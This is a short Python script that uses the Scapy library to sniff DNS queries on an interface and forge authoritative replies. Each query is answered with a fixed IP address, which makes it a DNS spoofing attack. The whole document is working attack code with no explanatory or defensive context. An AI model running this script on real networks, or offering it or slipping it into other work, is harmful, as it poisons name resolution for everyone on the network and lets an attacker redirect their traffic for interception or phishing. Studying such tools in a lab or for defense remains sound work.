# cat scapy_dns_answer_res.py -n
from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                    DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata='1.1.1.1')) 
        send(spoofed_pkt)
sniff(filter='udp and dst port 53', iface='eth0', store=0, prn=dns_spoof)